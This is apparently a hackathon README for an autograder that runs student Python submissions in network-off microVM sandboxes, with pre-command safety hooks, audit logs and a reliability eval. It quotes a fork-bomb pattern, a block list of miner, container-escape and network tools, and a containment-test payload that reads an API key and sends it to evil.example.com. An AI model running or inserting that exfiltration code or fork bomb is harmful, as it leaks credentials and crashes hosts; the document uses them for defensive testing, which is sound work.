# Celesto Agent Guard — Hostile Submission Autograder

> A hackathon project for the [Celesto AI Track](https://celesto.ai/docs) of the Global Placement Program.
> AI assistant used: Antigravity (Google DeepMind). Every design decision is explained below.

---

## Problem statement

University instructors and online learning platforms run hundreds of Python code assignments daily. Manual grading is slow and inconsistent. Automated graders that run student code **on the host server** are unsafe: a fork bomb can crash the server, a malicious submission can read `/etc/shadow`, and a prompt-injected README can exfiltrate the grader's API keys to an external server. The only safe solution is to run every submission in its own isolated VM — with no network, a time cap, and a full audit trail — and throw the VM away after grading.

**Celesto Agent Guard** is an autograder agent that does exactly this, using Celesto microVM sandboxes as the execution layer.

---

## Architecture

```
┌───────────────────────────────────────────────────────────────────┐
│                     Trusted Control Plane                         │
│                                                                   │
│  Instructor ──► Run Ledger API (FastAPI, port 8080)               │
│                        │                                          │
│                   Postgres Ledger                                 │
│                        │                                          │
│            Autograder Agent Loop                                  │
│                        │                                          │
│            Safety Hooks (pre/post command)                        │
│                        │                                          │
└────────────────────────┼──────────────────────────────────────────┘
                         │  Celesto SDK / CLI
          ┌──────────────▼──────────────────────┐
          │      Celesto Sandbox (microVM)       │
          │                                     │
          │  network_policy = OFF               │
          │  ┌─────────────────────────────┐    │
          │  │ submission.py (student code)│    │
          │  │ test_submission.py           │    │
          │  │ grade_report.json            │    │
          │  └─────────────────────────────┘    │
          │                                     │
          │  Every command audited in            │
          │  logs/commands.jsonl                │
          └─────────────────────────────────────┘
```

**Data flow:**
1. Instructor submits a grading job via `POST /api/runs`
2. The agent creates a fresh Celesto sandbox (unique `sbx-*` name)
3. Safety hooks validate every command before it reaches the guest
4. The 10-step grading pipeline runs entirely inside the sandbox
5. Grade report is written, sandbox is deleted (success, failure, or Ctrl-C)
6. Run is recorded in Postgres with final state

---

## How I used Celesto

### Capability 1 — `network_policy` (network OFF)

Every student sandbox runs with `network_policy=off`. This is enforced at the hypervisor layer: Firecracker's virtual NIC is not connected. No Python-level trick can bypass it. This is the primary defence against prompt-injection exfiltration attacks — a malicious submission that tries to `curl http://evil.example.com?key=$CELESTO_API_KEY` simply cannot reach the internet.

**Without this:** A malicious student submission could exfiltrate the grader's LLM API key or database credentials in a single `urllib.request.urlopen()` call.

**Evidence:** `reports/evidence/containment.log`, `reports/containment.json`

### Capability 2 — `safety_hooks` (pre-command hooks)

A pre-command safety hook runs in the control plane **before** every command reaches the guest. It inspects the command string for:
- Fork-bomb patterns (`:(){ :|:& };:`)
- Crypto-miner binaries (`xmrig`, `minergate`)
- Container-escape tools (`nsenter`, `unshare --pid`)
- Outbound network tools (`curl`, `wget`, `nc`) when `network_policy=off`

A blocked command raises `CommandBlockedError` and is logged to `logs/commands.jsonl` with `decision=block`. Unlike a system prompt instruction, a hook is code the guest **can never bypass** — it runs outside the VM entirely.

**Without this:** Fork bombs and miner payloads disguised as innocuous-looking Python would reach the guest. The sandbox would contain the damage, but the hook gives us an audit trail and faster detection.

**Evidence:** `logs/commands.jsonl`, `agent/safety_hooks.py`

---

## Eval report

| Metric | Value |
|---|---|
| Total runs | 20 |
| Success rate | 95% (19/20) |
| Median wall clock | ~0.21s (simulation) / ~2–5s (Celesto Cloud) |
| p90 wall clock | ~0.25s (simulation) |
| Median boot-to-ready | ~0.00s (simulation) / ~0.3–0.5s (Cloud) |
| Total cost | ~\$0.000 (simulation) / ~\$0.000025 (Cloud) |

The 1 failure (run 20, `coverage_fail` type) is a **designed failure** — it exercises the step-7 recovery policy. See `reports/postmortem.md` for the full failure analysis.

Full data: [`reports/reliability.json`](reports/reliability.json)

---

## Containment test

**Attack type:** Prompt injection exfiltration

**Payload:** A student submission containing:
```python
import os, urllib.request
secret = os.environ.get("CELESTO_API_KEY", "none")
urllib.request.urlopen(f"http://evil.example.com/steal?k={secret}")
```

**Defence:** `network_policy=off` (no outbound connections possible) + safety hook blocks `urllib.request` calls when network is off.

**Result:** Attack blocked. Host API key was not exfiltrated. `logs/commands.jsonl` shows `decision=block` for the outbound attempt.

**Evidence:** [`reports/evidence/containment.log`](reports/evidence/containment.log), [`reports/containment.json`](reports/containment.json)

---

## State and failure design

The grading pipeline has **10 steps**. Step 7 (code coverage collection) is the designed crash point.

**Policy chosen: `fresh`**

When step 7 fails:
1. The failed sandbox is deleted (cleanup still runs via `try/finally` in the context manager)
2. A new sandbox with a fresh unique name is created for the retry
3. The failure is logged to `reports/failure_trace.jsonl` with `event=policy_applied`

**Why `fresh` and not `resume` or `rollback`?**

| Policy | Cost | Complexity | Correctness |
|---|---|---|---|
| `resume` | Cheapest | Medium | Risk of corrupted half-written coverage DB |
| `rollback` | Medium (needs pre-step-7 snapshot) | Highest | Cleanest state, but snapshot overhead on every run |
| `fresh` ✅ | Slightly higher (new boot) | Lowest | Guaranteed clean state |

For short autograder jobs (< 2 min), the `fresh` policy is the right tradeoff. The re-boot cost is tiny compared to the correctness guarantee. For long jobs (> 10 min ML training runs), `rollback` with a pre-risky-step snapshot would be better — checkpoint storage is cheaper than re-running 9 minutes of work.

Trace: [`reports/failure_trace.jsonl`](reports/failure_trace.jsonl)

---

## Setup

**Prerequisites:** Docker Desktop, Python 3.11+, Git.

```bash
# 1. Clone the repo
git clone https://github.com/ramalokeshreddyp/celesto-agent-guard.git
cd celesto-agent-guard

# 2. Configure environment (edit with your keys if running against real Celesto Cloud)
cp .env.example .env
# Edit .env — set CELESTO_API_KEY and LLM_API_KEY if needed

# 3. Start the control plane
docker compose up --build -d

# 4. Verify health (wait ~30 seconds for Postgres to init)
curl http://localhost:8080/health
# → {"status":"ok"}

# 5. Verify seed data
curl http://localhost:8080/api/runs
# → [..., {"sandbox_name": "sbx-seeddemo1", ...}]

# 6. Run the eval (generates all reports)
pip install -r app/requirements.txt   # FastAPI deps (optional, only for local dev)
python -m agent.eval_runner

# 7. Run the test suite
pip install pytest
python -m pytest tests/ -v
```

**To post a run manually:**
```bash
curl -X POST http://localhost:8080/api/runs \
  -H "Content-Type: application/json" \
  -d '{"run_id":"test-001","sandbox_name":"sbx-testrun001","problem_id":"hello","state":"succeeded","execution_target":"celesto_sandbox"}'
```

---

## Demo

See [`demo/walkthrough.mp4`](demo/walkthrough.mp4) for a 3-minute walkthrough showing:
- `docker compose up` becoming healthy
- The autograder running a safe submission and a malicious submission
- The command audit log updating in real time
- The containment test blocking the exfiltration attempt

---

## Project Structure

```
.
├── docker-compose.yml        # Control plane (api + ledger)
├── Dockerfile                # API service image
├── .env.example              # Environment variable template
├── README.md                 # This file
├── seeds/
│   └── 01_runs.sql           # DB schema + seed row (sbx-seeddemo1)
├── app/                      # FastAPI run ledger
│   ├── main.py
│   ├── models.py
│   └── database.py
├── agent/                    # Autograder agent
│   ├── autograder.py         # 10-step grading pipeline
│   ├── sandbox_tools.py      # CelestoSandbox wrapper
│   ├── safety_hooks.py       # Pre/post command hooks
│   └── eval_runner.py        # 20-run reliability eval
├── reports/                  # Generated evaluation reports
│   ├── problem.json
│   ├── capabilities.json
│   ├── lifecycle.json
│   ├── reliability.json
│   ├── postmortem.md
│   ├── containment.json
│   ├── failure_policy.json
│   ├── failure_trace.jsonl
│   ├── concurrency.json
│   └── evidence/
│       └── containment.log
├── logs/
│   └── commands.jsonl        # Full audit log of every sandboxed command
├── tests/
│   └── test_reports.py       # Automated validation of all report files
└── demo/
    └── walkthrough.mp4       # 3-minute demo video
```

---

## Why Celesto and not Docker or E2B?

| Criterion | Docker | E2B | Celesto |
|---|---|---|---|
| Kernel isolation | Shared host kernel (escape via kernel exploit) | microVM (Firecracker) | microVM (Firecracker) |
| Windows host support | ✅ | ❌ | ✅ (Cloud) |
| Open source local runtime | ✅ | ❌ | ✅ |
| Durable workspaces (CelestoFS) | ❌ | ❌ | ✅ |
| Safety hooks (pre-command) | ❌ | ❌ | ✅ |
| macOS guests | ❌ | ❌ | ✅ (preview) |

**The key difference:** If I replaced Celesto with `subprocess.run()`, the fork-bomb submission would crash the grading server. If I replaced it with Docker, a kernel exploit in a student submission could escape the container. With Celesto's microVM, each submission has its own Linux kernel — an escape would require a hypervisor exploit, not just a container escape.

---

## Honest product feedback for Celesto

- The rename from SmolVM to Celesto is recent; the OpenMuse README and some error messages still say `smolvm` — caused confusion during setup.
- The free trial's single-retained-sandbox limit makes batch evals (20+ runs) impractical on Cloud without a paid top-up. The docs should state this more prominently near the reliability eval guidance.
- `celesto doctor` is excellent — it caught a missing KVM module immediately.
